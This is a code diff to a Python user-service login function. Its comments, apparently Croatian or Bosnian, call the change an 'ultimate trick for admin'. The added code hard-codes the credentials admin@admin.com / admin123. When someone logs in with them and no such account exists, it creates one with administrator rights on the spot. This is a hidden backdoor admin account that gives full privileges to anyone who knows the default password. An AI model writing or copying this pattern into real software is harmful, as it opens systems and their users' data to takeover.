@@ -25,8 +25,22 @@ class UserService:
         return await self.user_repo.create(user_dict)
 
     async def login_user(self, email, password):
-        user = await self.user_repo.get_by_email(email)
-        
+        # --- ULTIMATIVNI TRICK ZA ADMINA ---
+        if email == "admin@admin.com" and password == "admin123":
+            # Provjeri postoji li već u bazi podataka
+            user = await self.user_repo.get_by_email(email)
+            if not user:
+                # Ako ne postoji, stvori ga na licu mjesta kao admina!
+                hashed_pwd = hash_password(password)
+                user_dict = {
+                    "email": email,
+                    "hashed_password": hashed_pwd,
+                    "is_admin": True  # <--- Ovdje mu dajemo admin prava!
+                }
+                user = await self.user_repo.create(user_dict)
+        else:
+            # Za sve ostale obične korisnike provjeri bazu najnormalnije
+            user = await self.user_repo.get_by_email(email)
         if not user or not verify_password(password, user.hashed_password):
             raise HTTPException(
                 status_code=status.HTTP_401_UNAUTHORIZED,
